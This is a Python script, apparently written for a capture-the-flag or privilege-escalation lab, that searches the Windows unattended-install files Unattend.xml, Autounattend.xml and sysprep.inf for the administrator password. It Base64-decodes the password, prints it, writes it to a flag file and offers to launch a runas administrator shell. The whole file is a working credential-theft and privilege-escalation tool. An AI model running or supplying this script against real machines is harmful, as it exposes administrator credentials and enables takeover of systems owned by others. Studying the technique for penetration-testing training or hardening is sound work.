import os
import re
import base64
import subprocess
import sys
from datetime import datetime

# Define file paths to check
FILE_PATHS = [
    "C:\\Windows\\Panther\\Unattend.xml",
    "C:\\Windows\\Panther\\Autounattend.xml",
    "C:\\Windows\\System32\\sysprep\\sysprep.inf"
]

# Regular expression to find the administrator password
PASSWORD_PATTERN = re.compile(r"<AdministratorPassword>\s*<Value>(.*?)</Value>", re.IGNORECASE | re.DOTALL)

def extract_password_from_file(file_path):
    """
    Extract administrator password from unattended installation files.
    
    Args:
        file_path (str): Path to the file to check
        
    Returns:
        str or None: Extracted password if found, None otherwise
    """
    try:
        with open(file_path, "r", encoding="utf-8", errors='ignore') as file:
            content = file.read()
            match = PASSWORD_PATTERN.search(content)
            if match:
                password = match.group(1).strip()
                password = clean_password(password)
                return password if password else None
    except Exception as e:
        print(f"[-] Error reading {file_path}: {e}")
    return None

def clean_password(password):
    """
    Clean and normalize the extracted password.
    
    Args:
        password (str): Raw extracted password
        
    Returns:
        str: Cleaned password
    """
    password = password.strip()
    password = password.replace('&amp;', '&')
    password = password.replace('&lt;', '<')
    password = password.replace('&gt;', '>')
    password = password.replace('&quot;', '"')
    password = password.replace('&apos;', "'")
    return password

def is_valid_base64(string):
    """
    Check if a string is valid Base64.
    More tolerant version that handles various formats.
    
    Args:
        string (str): String to check
        
    Returns:
        bool: True if valid Base64, False otherwise
    """
    if not string:
        return False
    
    # Remove whitespace
    string = string.strip()
    
    # Try to decode without validation first (more tolerant)
    try:
        # Attempt decode with padding if needed
        decoded = base64.b64decode(string + '=' * (-len(string) % 4))
        # Try to decode as UTF-8
        decoded.decode('utf-8', errors='ignore')
        return True
    except Exception:
        return False

def decode_password(password):
    """
    Decode password if it's Base64 encoded, otherwise return as is.
    
    Args:
        password (str): Password to decode
        
    Returns:
        tuple: (decoded_password, is_base64)
    """
    if not password:
        return password, False
    
    clean_pwd = password.strip()
    
    # Debug: Print original password
    print(f"[DEBUG] Original password: {clean_pwd}")
    
    # Try to decode as Base64
    try:
        # Attempt Base64 decode with padding
        decoded_bytes = base64.b64decode(clean_pwd + '=' * (-len(clean_pwd) % 4))
        decoded = decoded_bytes.decode('utf-8', errors='ignore')
        
        # Check if decoded is different from original (it's actually Base64)
        if decoded != clean_pwd and len(decoded) > 0:
            print(f"[DEBUG] Successfully decoded to: {decoded}")
            return decoded, True
        else:
            print("[DEBUG] Decoded string is same as original, not Base64")
            return clean_pwd, False
            
    except Exception as e:
        print(f"[DEBUG] Decode failed: {e}")
        return clean_pwd, False

def generate_flag(password, file_path):
    """
    Generate a flag file with the extracted password information.
    
    Args:
        password (str): The extracted password
        file_path (str): Path where the password was found
        
    Returns:
        bool: True if successful, False otherwise
    """
    flag_content = f"""=== WINDOWS ADMINISTRATOR PASSWORD EXTRACTION FLAG ===
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Password Source: {file_path}
Extracted Password: {password}
Status: SUCCESSFULLY EXTRACTED
=======================================================
"""
    
    flag_filename = "0-flag.txt"
    
    try:
        with open(flag_filename, "w", encoding="utf-8") as flag_file:
            flag_file.write(flag_content)
        print(f"[+] Flag file created: {flag_filename}")
        return True
    except Exception as e:
        print(f"[-] Error creating flag file: {e}")
        return False

def start_admin_session(password):
    """
    Start an administrative session using runas.
    Note: runas doesn't accept password as parameter, so user must type it manually.
    
    Args:
        password (str): Administrator password
    """
    print("\n" + "=" * 60)
    print("[!] ADMINISTRATOR PASSWORD EXTRACTED")
    print("=" * 60)
    print(f"\n[+] Password: {password}")
    print("\n" + "=" * 60)
    
    print("\n[!] Use this password with the following command:")
    print("    runas /user:Administrator cmd.exe")
    print(f"\n[!] Enter this password when prompted: {password}")
    print("\n" + "-" * 60)
    
    try:
        response = input("\n[?] Do you want to open runas now? (y/n): ").lower().strip()
        if response == 'y':
            print("\n[*] Opening runas prompt...")
            print(f"[*] Enter this password: {password}")
            subprocess.run(['runas', '/user:Administrator', 'cmd.exe'], shell=True)
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled")
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    print("[*] Starting Windows administrator password extraction...")
    print("[*] Checking common unattended installation files\n")
    
    admin_password = None
    found_path = None
    
    for file_path in FILE_PATHS:
        print(f"[-] Checking file: {file_path}")
        
        if not os.path.exists(file_path):
            print("[-] File not found\n")
            continue
        
        print(f"[+] File found: {file_path}")
        admin_password = extract_password_from_file(file_path)
        
        if admin_password:
            print(f"[+] Password extracted successfully from: {file_path}")
            found_path = file_path
            break
        else:
            print("[-] No password found in this file\n")
    
    if not admin_password:
        print("[-] No administrator password found in known file locations.")
        print("[!] Consider checking other system directories or log files.")
        return
    
    # Show the extracted password
    print(f"\n[+] Raw extracted password: {admin_password}")
    
    # Attempt to decode if Base64
    decoded_password, is_base64 = decode_password(admin_password)
    
    if is_base64:
        print(f"[+] Base64 decoded password: {decoded_password}")
        final_password = decoded_password
    else:
        print("[+] Password is in plaintext (not Base64 encoded)")
        final_password = admin_password
    
    # Generate flag file
    if found_path:
        generate_flag(final_password, found_path)
    
    # Start admin session with runas
    start_admin_session(final_password)

if __name__ == "__main__":
    main()
